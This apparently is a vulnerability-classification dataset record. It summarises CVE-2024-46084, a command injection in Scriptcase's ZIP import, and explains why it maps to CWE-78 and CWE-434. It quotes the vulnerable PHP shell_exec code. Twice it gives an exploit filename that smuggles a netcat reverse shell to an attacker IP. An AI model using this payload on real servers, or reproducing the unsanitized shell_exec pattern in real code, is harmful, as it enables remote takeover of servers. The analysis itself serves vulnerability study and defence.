  "reference_content": "Based on the provided content, here's the breakdown of CVE-2024-46084:\n\n**Root Cause of Vulnerability:**\n- The vulnerability lies within the `nm_unzip` function used in the import feature of Scriptcase. This function executes a `shell_exec` command using the `7za` binary to extract uploaded ZIP files. The filename of the uploaded file, which is user-controlled, is passed directly to the shell command without proper sanitization.\n\n**Weaknesses/Vulnerabilities Present:**\n- **Remote Code Execution (RCE):** The unsanitized input to the `shell_exec` function allows an attacker to inject arbitrary commands into the operating system.\n- **Insecure use of `shell_exec`:** The function uses `shell_exec` with user-provided input without any input validation or sanitization which can lead to command injection.\n\n**Impact of Exploitation:**\n- Successful exploitation allows an attacker to execute arbitrary code on the server hosting the Scriptcase application.\n- This can lead to a complete compromise of the application and the server, potentially allowing for data theft, malware installation, or further attacks on the internal network.\n\n**Attack Vectors:**\n- The attack vector is the import feature of Scriptcase, which allows users to upload ZIP files.\n- The filename of the uploaded file is used directly within a shell command.\n\n**Required Attacker Capabilities/Position:**\n- The attacker needs to have an account with permissions to import projects in Scriptcase\n- The attacker needs to craft a malicious ZIP filename containing shell commands.\n- The attacker needs to upload the file using the import functionality.\n\n**Technical Details:**\n\n- The vulnerable code snippet:\n```php\nfunction nm_unzip($v_str_file, $v_str_dir)\n{\n    global $nm_config;\n    nm_dir_create($v_str_dir);\n    $_so = nm_op_sys();\n    if ($_so != \"mac\" && is_dir($nm_config[\"path_prod\"] . \"third/zip/\")) {\n        $_7z = $nm_config[\"path_prod\"] . \"third/zip/\";\n        $dir_extract = $v_str_dir;\n        $_zip_file = $v_str_file;\n        // ... OS specific path selection...\n        $_chold = getcwd();\n        chdir($nm_config[\"path_tmp\"]);\n        shell_exec($_7z . \" x \" . $_zip_file . \" -aos -o\" . $dir_extract);\n        chdir($_chold);\n    } \n    // ... fallback code ...\n}\n```\n- The filename `$v_str_file` is directly included in the `shell_exec` command without proper sanitization.\n- The provided exploit uses a filename such as `\"e.zip;nc -c sh 192.168.0.146 1337 #.zip\"`, where the included command executes a reverse shell to the attacker's machine via netcat.\n\nThis blog post provides more details than the original CVE description.",

The code snippet in the CVE reference link content summary confirms that the filename is directly used in the `shell_exec` command without any sanitization.\n\nThe selection of CWE-78 is based on the fact that the **root cause** is the **improper neutralization** of special elements used in an OS command. The vulnerability is triggered when the `nm_unzip` function executes a `shell_exec` command using the `7za` binary to extract uploaded ZIP files. The filename of the uploaded file, which is user-controlled, is passed directly to the shell command without proper sanitization. The exploit uses a malicious ZIP filename containing shell commands, such as `\"e.zip;nc -c sh 192.168.0.146 1337 #.zip\"`, to execute arbitrary code on the server.\n\nCWE-434 is included because the vulnerability is triggered by uploading a file.\n\nThe selected CWEs are at the optimal level of specificity because they accurately represent the root cause and the triggering condition of the vulnerability. CWE-78 is a base-level CWE, which is the preferred level of abstraction for mapping to the root causes of vulnerabilities.\n\nCWE-94, Improper Control of Generation of Code ('Code Injection'), was considered but not selected because it is a more general CWE that encompasses various types of code injection vulnerabilities.
